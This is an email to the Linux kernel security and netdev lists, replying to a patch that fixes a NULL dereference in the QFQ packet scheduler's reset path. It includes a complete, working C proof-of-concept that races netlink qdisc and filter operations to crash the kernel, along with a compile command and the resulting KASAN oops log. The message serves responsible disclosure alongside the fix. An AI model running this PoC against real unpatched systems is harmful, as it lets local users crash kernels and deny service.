Return-Path: <netdev+bounces-243687-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from sea.lore.kernel.org (sea.lore.kernel.org [IPv6:2600:3c0a:e001:db::12fc:5321])
	by mail.lfdr.de (Postfix) with ESMTPS id 80B10CA5E2A
	for <lists+netdev@lfdr.de>; Fri, 05 Dec 2025 03:11:21 +0100 (CET)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sea.lore.kernel.org (Postfix) with ESMTP id 4455430572D0
	for <lists+netdev@lfdr.de>; Fri,  5 Dec 2025 02:11:20 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 9CEAF2C237E;
	Fri,  5 Dec 2025 02:11:19 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="HYtKa+f9"
X-Original-To: netdev@vger.kernel.org
Received: from mail-pf1-f174.google.com (mail-pf1-f174.google.com [209.85.210.174])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 651732D839D
	for <netdev@vger.kernel.org>; Fri,  5 Dec 2025 02:11:16 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.174
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1764900679; cv=none; b=ABoPoY8cW5FUzkRHZVcqX5VBLyXhseBSkxV9foziV62UsQisIcKrWc8ODNZ/zFTOmUBs8HZyucqQXkFJjE39W+UTnGMmT2fGLSIHFjrvgzhP1VBLYFA8QPU+2any/onWWdMzvStu4kSSfeGQk5bZfD/F7p9s2INPzq/WWDyRAaM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1764900679; c=relaxed/simple;
	bh=E7cBEjfEZhNwWxU+cN4bCRzEGIzCU7C234YA61dS+ao=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=NgIJO4JDGIOsuR+Dng4i0aYHMyZhXZuF89HMRB1WM/2rPLUdJGFFiveREXCbLU6RgGwwjlheBN3VweCGhc1kc+bteX9TUUFa81nTl14ThGlvfGAQzTikQLuIaflia3POTu9XbFCz7V0fSuPvMHUFGjoPEdIu6w5HlMumNLqilJY=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=HYtKa+f9; arc=none smtp.client-ip=209.85.210.174
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Received: by mail-pf1-f174.google.com with SMTP id d2e1a72fcca58-7b80fed1505so1805849b3a.3
        for <netdev@vger.kernel.org>; Thu, 04 Dec 2025 18:11:15 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1764900675; x=1765505475; darn=vger.kernel.org;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:from:to:cc:subject:date:message-id:reply-to;
        bh=vvF1S7tNaEVAtoGN6u0ROVj1BpNwYqC/gKFSF+5UwPY=;
        b=HYtKa+f99OT5vuPeJsW/morcyI/gvOzVmF9yuQWNFKIZYFOV4LmWZEuW2dQ0Q5Bj/3
         Vh7wcvx1eKpTnlAInHML4MPEgOhPl1giYrmZtrYzRkcUCNjmgXYwz2mNdBuAuGeGFPZ8
         ov8gMjli7/eaQ/xYjbvnB5mYq2B3JdICO3pfoVeHwhTBxI8i2I3Vc1lBhTxTXla0ffa7
         aqICweQtXu5t9XRvTooe33rmwZswLyHXoa2rEmtniRnsWFjXEx2hU6tNHlGj4ONNlrCd
         I5z/lU0zHIie+FKEmDlOsUDoy7p4zsV1Vuo2f0cG/f15gBDjIJuuPcVQ53e6BxiXj3RE
         jpug==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1764900675; x=1765505475;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:x-gm-gg:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=vvF1S7tNaEVAtoGN6u0ROVj1BpNwYqC/gKFSF+5UwPY=;
        b=l7tYqRmBGASrddY+VPTDbWGwg1BTFfKp2dmr6MNWkCHrJzca/gSkBL80Xd/nJHnEGc
         4tP7kALPf11aO0nNVAyGk/ZLWcMwpCKHEKaZSN1jUUn9AvdeMmDPJIjDW0Dmb4ekqROw
         floYBmdSIKD13P+FI48d0mGo0nUdBACiXdSQkn/J5i9OZSV77ikP3nM0DaQxvHFnln3u
         66aRSOyAHLsCDMTgY1yArfsXOpUhmUFZKEhTPyldC65R9Nt3uiq6W/Ass56NdWN8pVe6
         GYibbxWntsHIasM26a2EKB/P4R+h4OVdjAtUyksF8L9NgpEEphussU1Gl9awSDw4clbv
         iD5A==
X-Gm-Message-State: AOJu0Yx9i3nawUGaeUoQyqvvh/PFTeWo0vd3clkVZDmQzgzwduatDEHt
	B/kwcWMUmIWD60SstMELv8ct8JBvPwUNtjZ29WO2WnuFBvwt7Zpu9jmIVU/dzkvU6Q==
X-Gm-Gg: ASbGncu2RfaBDmGB/UltqCpvllyEjD1PdzJ6mTlGhwVX6w5y8MKm3E4bs404tnGAt4a
	dQLg63ALBbrMne0FEVHU+Lk1KYx1z0hCdCX8jkIJcaShk5RckF/qYOmCawf1uq8aLCTtabS6eQ0
	yxyyW/qqF0x/CM3G+cp7GjbwbXuGomDlFP6ahEHk4WJmERs0kbYPIkGFm41qJcbis4jGv0ulLDn
	vCFDYO9k1a8BLLR8NpBpJjkFF4eDuOz1lEBZYef5KFq9PRnnsK74PzLmZMlILGPv9ry0U9yxxyu
	WPPUgcbwEfQ+Q9uKqmS23Ivv/8xtMxsEXbLhG1kgwF8CXYmGYeVzImoM0Z6Hw2quMwwehnq5Oov
	ZKZ+J6vafS1kS1Enx8PSw0rqF8OKqOnUvxSxtAwsTvhe8EByGeh5NgLCe0InUhcWHKVdxfgbFmf
	6N4iOasCnYduyy5Nrk
X-Google-Smtp-Source: AGHT+IECfpd8nqUSzZYhoRmG6aVGnWHYDnprbiY7Q9lLHlX4ZIx4QRLpTAcYJQlyEaWmev1M1Eu3FQ==
X-Received: by 2002:a05:7022:1607:b0:11a:3734:3db3 with SMTP id a92af1059eb24-11df0cd7faemr4694034c88.32.1764900674938;
        Thu, 04 Dec 2025 18:11:14 -0800 (PST)
Received: from p1 (209-147-139-51.nat.asu.edu. [209.147.139.51])
        by smtp.gmail.com with ESMTPSA id a92af1059eb24-11df7703bd7sm14934923c88.10.2025.12.04.18.11.13
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 04 Dec 2025 18:11:14 -0800 (PST)
Date: Thu, 4 Dec 2025 19:11:12 -0700
From: Xiang Mei <xmei5@asu.edu>
To: security@kernel.org
Cc: netdev@vger.kernel.org, jhs@mojatatu.com, xiyou.wangcong@gmail.com, 
	jiri@resnulli.us
Subject: Re: [PATCH net] net/sched: sch_qfq: Fix NULL deref when deactivating
Message-ID: <4mxbjdgdxufrv7rm7krt4j7nknqlwi6kcilpjg2tbcxzgrxif3@tdobbjya7euj>
References: <20251205014855.736723-1-xmei5@asu.edu>
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20251205014855.736723-1-xmei5@asu.edu>

On Thu, Dec 04, 2025 at 06:48:55PM -0700, Xiang Mei wrote:
> `qfq_class->leaf_qdisc->q.qlen > 0` does not imply that the class
> itself is active.
> 
> Two qfq_class objects may point to the same leaf_qdisc. This happens
> when:
> 
> 1. one QFQ qdisc is attached to the dev as the root qdisc, and
> 
> 2. another QFQ qdisc is temporarily referenced (e.g., via qdisc_get()
> / qdisc_put()) and is pending to be destroyed, as in function
> tc_new_tfilter.
> 
> When packets are enqueued through the root QFQ qdisc, the shared
> leaf_qdisc->q.qlen increases. At the same time, the second QFQ
> qdisc triggers qdisc_put and qdisc_destroy: the qdisc enters
> qfq_reset() with its own q->q.qlen == 0, but its class's leaf
> qdisc->q.qlen > 0. Therefore, the qfq_reset would wrongly deactivate
> an inactive aggregate and trigger a null-deref in qfq_deactivate_agg.
> 
> Fixes: 0545a3037773 ("pkt_sched: QFQ - quick fair queue scheduler")
> Signed-off-by: Xiang Mei <xmei5@asu.edu>
> ---
>  net/sched/sch_qfq.c | 2 +-
>  1 file changed, 1 insertion(+), 1 deletion(-)
> 
> diff --git a/net/sched/sch_qfq.c b/net/sched/sch_qfq.c
> index d920f57dc6d7..f4013b547438 100644
> --- a/net/sched/sch_qfq.c
> +++ b/net/sched/sch_qfq.c
> @@ -1481,7 +1481,7 @@ static void qfq_reset_qdisc(struct Qdisc *sch)
>  
>  	for (i = 0; i < q->clhash.hashsize; i++) {
>  		hlist_for_each_entry(cl, &q->clhash.hash[i], common.hnode) {
> -			if (cl->qdisc->q.qlen > 0)
> +			if (cl_is_active(cl))
>  				qfq_deactivate_class(q, cl);
>  
>  			qdisc_reset(cl->qdisc);
> -- 
> 2.43.0
>
The PoC and intended crash are attached for your reference:

PoC:
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <linux/types.h>
#include <linux/pkt_sched.h>

typedef unsigned char       u8;
typedef unsigned short      u16;
typedef unsigned int        u32;
typedef unsigned long long  u64;
struct schedAttr {
    size_t type;
    size_t size;
    unsigned char * ctx;
};

typedef struct tf_msg {
    struct nlmsghdr nlh;
    struct tcmsg tcm;
#define TC_DATA_LEN 0x200
    char attrbuf[TC_DATA_LEN];
};

struct if_msg {
    struct nlmsghdr nlh;
    struct ifinfomsg ifi;
};
static inline unsigned short add_rtattr (unsigned long rta_addr, unsigned short type, unsigned short len, char *data) {
    struct rtattr *rta = (struct rtattr *)rta_addr;
    rta->rta_type = type;
    rta->rta_len = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    return rta->rta_len;
}

void pinCPU(int id){
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(id, &my_set);
    sched_setaffinity(0, sizeof(cpu_set_t), &my_set);
}

#define FAIL_IF(x) if ((x)) { \
    printf("\033[0;31m"); \
    perror(#x); \
    printf("\033[0m\n"); \
    exit(-1); \
}

#define FAIL(x, msg) if ((x)) { \
    printf("\033[0;31m"); \
    printf("%s\n",msg); \
    perror(#x); \
    printf("\033[0m\n"); \
    exit(-1); \
}
static inline void NLMsgSend (int sock, struct tf_msg *m) {
    struct {
        struct nlmsghdr nh;
        struct nlmsgerr ne;
    } ack;
    FAIL_IF(write(sock, m, m->nlh.nlmsg_len) == -1);
    FAIL_IF(read(sock , &ack, sizeof(ack)) == -1);
    FAIL_IF(ack.ne.error);
}
static inline void NLMsgSend_noerr (int sock, struct tf_msg *m) {
    struct {
        struct nlmsghdr nh;
        struct nlmsgerr ne;
    } ack;
    FAIL_IF(write(sock, m, m->nlh.nlmsg_len) == -1);
    // FAIL_IF(read(sock , &ack, sizeof(ack)) == -1);
}

int bring_interface_down_up(const char* ifname, int up)
{
    struct ifreq ifr = {0};
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
        return -1;
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    int res = ioctl(sock, SIOCGIFFLAGS, &ifr);
    if (res < 0)
        return -1;
    if (up)
        ifr.ifr_flags |= IFF_UP;
    else
        ifr.ifr_flags &= ~IFF_UP;
    res = ioctl(sock, SIOCSIFFLAGS, &ifr);
    if (res < 0)
        return -1;
    close(sock);
    return 0;
}

int delete_root_qdisc(const char* ifname) {
    int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (sock < 0)
        return -1;
    struct {
        struct nlmsghdr nlh;
        struct tcmsg tcm;
        char buf[1024];
    } req = {0};
    req.nlh.nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    req.nlh.nlmsg_type = RTM_DELQDISC;
    req.nlh.nlmsg_flags = NLM_F_REQUEST;
    req.tcm.tcm_family = AF_UNSPEC;
    req.tcm.tcm_ifindex = if_nametoindex(ifname);
    req.tcm.tcm_parent = 0xFFFFFFFF;
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    int res = sendto(sock, &req, req.nlh.nlmsg_len, 0, (struct sockaddr*)&nladdr,
                   sizeof(nladdr));
    if (res < 0)
        return -1;
    close(sock);
    return 0;
}

int net_reset() {
    const char* ifname = "lo";
    if (bring_interface_down_up(ifname, 0) < 0) {
        perror("bring_interface_down_up(lo, 0)");
        return -1;
    }
    if (delete_root_qdisc(ifname) < 0) {
        perror("delete_root_qdisc(lo)");
        return -2;
    }
    if (bring_interface_down_up(ifname, 1) < 0) {
        perror("bring_interface_down_up(lo, 1)");
        return -3;
    }
    return 0;
}

static inline void init_tf_msg (struct tf_msg *m) {
    // nlmsghdr
    m->nlh.nlmsg_len    = NLMSG_LENGTH(sizeof(m->tcm));
    m->nlh.nlmsg_type   = 0;    // Default Value
    // We need these flags since https://elixir.bootlin.com/linux/v6.11.8/source/net/netlink/af_netlink.c#L2540
    m->nlh.nlmsg_flags  = NLM_F_REQUEST | NLM_F_ACK;
    m->nlh.nlmsg_seq    = 0;    // Default Value
    m->nlh.nlmsg_pid    = 0;    // Default Value

    // tcmsg
    m->tcm.tcm_family   = PF_UNSPEC;
    m->tcm.tcm_ifindex  = if_nametoindex("lo");
    m->tcm.tcm_handle   = 0;    // Default Value
    m->tcm.tcm_parent   = -1;   // Default Value for no parent
    m->tcm.tcm_info     = 0;    // Default Value
}
void loopbackSend2(u32 priority, u64 len){
    struct sockaddr iaddr = { AF_INET };
    int inet_sock_fd = socket(PF_INET, SOCK_DGRAM, 0);
    FAIL_IF(inet_sock_fd < 0 );
    FAIL_IF(setsockopt(inet_sock_fd, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority))< 0 );
    FAIL_IF(connect(inet_sock_fd, &iaddr, sizeof(iaddr)) < 0 );
    if(len < 0x2a)
        len+=0x2a;
    FAIL_IF(write(inet_sock_fd, "", len-0x2a) < 0);
    close(inet_sock_fd);
}
int initNL(void ){
    struct if_msg if_up_msg = {
        {
            .nlmsg_len = 32,
            .nlmsg_type = RTM_NEWLINK,
            .nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK,
        },
        {
            .ifi_family = AF_UNSPEC,
            .ifi_type = ARPHRD_NETROM,
            .ifi_index = 1,
            .ifi_flags = IFF_UP,
            .ifi_change = 1,
        },
    };
    int nl_sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    FAIL_IF(nl_sock_fd < 0);
    if_up_msg.ifi.ifi_index = if_nametoindex("lo");
    NLMsgSend(nl_sock_fd, (struct tf_msg *)(&if_up_msg));
    return nl_sock_fd;
}

enum QDISC_OPS {
    QDISC_ADD,
    QDISC_CHANGE
};
enum CLS_OPS{
    CLS_ADD,
    CLS_EDIT,
    CLS_DEL
};

struct tf_msg * qfqQdisc(enum QDISC_OPS OPS,u32 handle, u32 parent){
    // Kernel Handler: function hfsc_init_qdisc
    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
    // -> Calling tc_modify_qdisc
    init_tf_msg(m);
    m->nlh.nlmsg_type    = RTM_NEWQDISC;
    if (OPS == QDISC_ADD)
        m->nlh.nlmsg_flags   |= NLM_F_CREATE;
    else
        m->nlh.nlmsg_flags   |= NLM_F_REPLACE | NLM_F_CREATE;
    m->tcm.tcm_handle    = handle;
    m->tcm.tcm_parent    = parent;

    // Set TCA_KIND
    m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((size_t)(m) + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("qfq") + 1, "qfq"));
    return m;
}

struct tf_msg * qfqClassAdd(int type, u32 classid,u32 val){
    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
    init_tf_msg(m);
    m->nlh.nlmsg_type       = RTM_NEWTCLASS;
    m->tcm.tcm_parent       = classid>>16<<16;
    m->tcm.tcm_handle       = classid;
    m->nlh.nlmsg_flags      |= NLM_F_CREATE;
    m->nlh.nlmsg_len        += NLMSG_ALIGN(add_rtattr((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("qfq") + 1, "qfq"));

    struct rtattr *opts     = (struct rtattr *)((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len));
    opts->rta_type          = TCA_OPTIONS;
    opts->rta_len           = RTA_LENGTH(0);

    if(type == TCA_QFQ_LMAX)
        opts->rta_len += RTA_ALIGN(add_rtattr((size_t)opts + opts->rta_len, TCA_QFQ_LMAX, sizeof(val), (char *)&val));
    else if(type == TCA_QFQ_WEIGHT)
        opts->rta_len += RTA_ALIGN(add_rtattr((size_t)opts + opts->rta_len, TCA_QFQ_WEIGHT, sizeof(val), (char *)&val));
    m->nlh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
    return m;
}

struct tf_msg * netemQdisc(enum QDISC_OPS OPS, u32 handle, u32 parent, u32 usec){
    struct tf_msg *m = calloc(1,sizeof(struct tf_msg));
    // -> Calling tc_modify_qdisc
    init_tf_msg(m);
    m->nlh.nlmsg_type    = RTM_NEWQDISC;
    if (OPS == QDISC_ADD)
        m->nlh.nlmsg_flags   |= NLM_F_CREATE;
    else
        m->nlh.nlmsg_flags   |= NLM_F_REPLACE | NLM_F_CREATE;
    m->tcm.tcm_handle    = handle >> 16 << 16;
    m->tcm.tcm_parent    = parent;

    // Set TCA_KIND
    m->nlh.nlmsg_len     += NLMSG_ALIGN(add_rtattr((size_t)(m) + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("netem") + 1, "netem"));

    // Add delay attribute to TCA_OPTIONS
    struct tc_netem_qopt qopt_attr={};
    qopt_attr.latency = 1000u * 1000 * 5000 * usec; // Delay in us
    qopt_attr.limit   = 1;
    m->nlh.nlmsg_len += NLMSG_ALIGN(add_rtattr((size_t)(m) + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_OPTIONS, sizeof(qopt_attr), (char *)&qopt_attr));
    return m;
}

struct tf_msg * netCLS(enum CLS_OPS OPS, char * name, u32 handle, u32 parent, unsigned short prio, struct schedAttr attrL[], size_t nr_attr) {
    struct tf_msg *m = calloc(1, sizeof(struct tf_msg)+0x4000);
    init_tf_msg(m); // Initialize the tf_msg structure

    if(OPS == CLS_DEL)
        m->nlh.nlmsg_type   = RTM_DELTFILTER;
    else
        m->nlh.nlmsg_type   = RTM_NEWTFILTER;

    if (OPS == CLS_ADD || OPS == CLS_DEL)
        m->nlh.nlmsg_flags   |= NLM_F_CREATE;
    else
        m->nlh.nlmsg_flags   |= NLM_F_REPLACE | NLM_F_CREATE;
    m->tcm.tcm_info     = (prio << 16) | htons(ETH_P_IP); // Priority and protocol

    m->tcm.tcm_handle   = handle;
    m->tcm.tcm_parent   = parent;

    m->nlh.nlmsg_len += NLMSG_ALIGN(
        add_rtattr((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen(name) + 1, name)
    );

    if(attrL==0)
        return m;

    // Add TCA_OPTIONS
    struct rtattr *opts = (struct rtattr *)((size_t)m + NLMSG_ALIGN(m->nlh.nlmsg_len));
    opts->rta_type = TCA_OPTIONS;
    opts->rta_len = RTA_LENGTH(0);
    for( int i = 0 ; i < nr_attr ; i++ ){
        struct schedAttr * attr = &attrL[i];
        if(!attr)
            continue;
        opts->rta_len += RTA_ALIGN(
            add_rtattr((size_t)opts + RTA_ALIGN(opts->rta_len), attr->type, attr->size, attr->ctx)
        );
    }
    // Finalize the message length
    m->nlh.nlmsg_len += NLMSG_ALIGN(opts->rta_len);
    return m;
}
struct tf_msg * qdiscDel(u32 handle) {
    struct tf_msg *m = calloc(1, sizeof(struct tf_msg));
    init_tf_msg(m);

    m->nlh.nlmsg_type    = RTM_DELQDISC;
    m->tcm.tcm_handle    = handle;
    m->tcm.tcm_parent    = -1;
    return m;
}

int poc(void)
{
    net_reset();
    unsigned int targetClass = 0x10001;
    struct schedAttr attrL[]= {
        {
        .type = 1,
        .size = sizeof(targetClass),
        .ctx  = &targetClass
        }
    };

    int nl = initNL();
    NLMsgSend(nl, qfqQdisc(QDISC_ADD,0x10000, -1));
    NLMsgSend(nl, qfqClassAdd(TCA_QFQ_LMAX, 0x10001, 0x400));
    NLMsgSend(nl, netemQdisc(QDISC_ADD,0x20000, 0x10001, 10));
    NLMsgSend(nl, netCLS(CLS_ADD,"basic", 0x10001,0, 0x131, attrL, 1));

    // debug();
    int pid = fork();

    if(pid==0)
    {
        pinCPU(1);
        // Step 0
        NLMsgSend_noerr(nl, qdiscDel(0x10000));
        // Step 2
        NLMsgSend_noerr(nl, qfqQdisc(QDISC_ADD,0x10000, -1));
        // Step 3
        NLMsgSend_noerr(nl, qfqClassAdd(TCA_QFQ_LMAX, 0x10001, 0x200));
        // Step 4
        NLMsgSend_noerr(nl, netemQdisc(QDISC_ADD,0x20000, 0x10001, 10));
        // Step 5
        loopbackSend2(0x10001, 1);
        exit(1);
    }
    else{
        pinCPU(0);
        // Step 1
        NLMsgSend_noerr(nl, netCLS(CLS_ADD,"n132", 0x10001,0, 0x132, attrL, 1));
        waitpid(pid, 0, 0);
    }

    close(nl);
    return 0 ;
}

int main(){
    while(1)
        poc();
}
```

Compile Command: 
```sh
gcc ./poc.c -o ./poc -w --static
```

Intended Crash:
```log
...
[    1.024152] Oops: general protection fault, probably for non-canonical address 0xdffffc0000000000: 0000 [#1] SMP KASAN NOPTI
[    1.024993] KASAN: null-ptr-deref in range [0x0000000000000000-0x0000000000000007]
[    1.025387] CPU: 0 UID: 0 PID: 135 Comm: exploit Not tainted 6.12.57 #3
[    1.025742] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.17.0-0-gb52ca86e094d-prebuilt.qemu.org 04/01/2014
[    1.026329] RIP: 0010:qfq_deactivate_agg+0x187/0xca0
[    1.026600] Code: 00 fc ff df 48 89 fe 48 c1 ee 03 80 3c 16 00 0f 85 1d 09 00 00 48 be 00 00 00 00 00 fc ff df 48 8b 53 08 48 89 d7 48 c1 ef 03 <80> 3c 37 00 0f 85 d5 08 0
[    1.027563] RSP: 0018:ffff8880105e73f8 EFLAGS: 00010246
[    1.027849] RAX: 0000000000000000 RBX: ffff888011e58300 RCX: ffff888011f0d358
[    1.028211] RDX: 0000000000000000 RSI: dffffc0000000000 RDI: 0000000000000000
[    1.028574] RBP: ffff888011f0d340 R08: ffff888011e58458 R09: ffff888011e58458
[    1.028950] R10: 1ffff110023cb08c R11: ffffffff89689156 R12: 0000000000000000
[    1.029319] R13: ffff888011f0c180 R14: 0000000000000000 R15: ffff888011f0d350
[    1.029691] FS:  000000000551f380(0000) GS:ffff8880bf000000(0000) knlGS:0000000000000000
[    1.030093] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    1.030388] CR2: 00007fff8ceca10c CR3: 000000001074c002 CR4: 0000000000772ef0
[    1.030776] PKRU: 55555554
[    1.030916] Call Trace:
[    1.031047]  <TASK>
[    1.031159]  qfq_reset_qdisc+0x27c/0x3e0
[    1.031369]  ? __pfx_mutex_lock+0x10/0x10
[    1.031582]  qdisc_reset+0x9d/0x590
[    1.031785]  ? __tcf_block_put+0x2e/0x2b0
[    1.031987]  ? __pfx_mutex_unlock+0x10/0x10
[    1.032199]  ? __tcf_chain_put+0x4a/0x880
[    1.032409]  __qdisc_destroy+0xb2/0x280
[    1.032611]  tc_new_tfilter+0x9af/0x2180
[    1.032821]  ? __pfx_stack_trace_consume_entry+0x10/0x10
[    1.033090]  ? __pfx_stack_trace_consume_entry+0x10/0x10
...
```

If you need more details, feel free to let me know.

Thanks,
Xiang

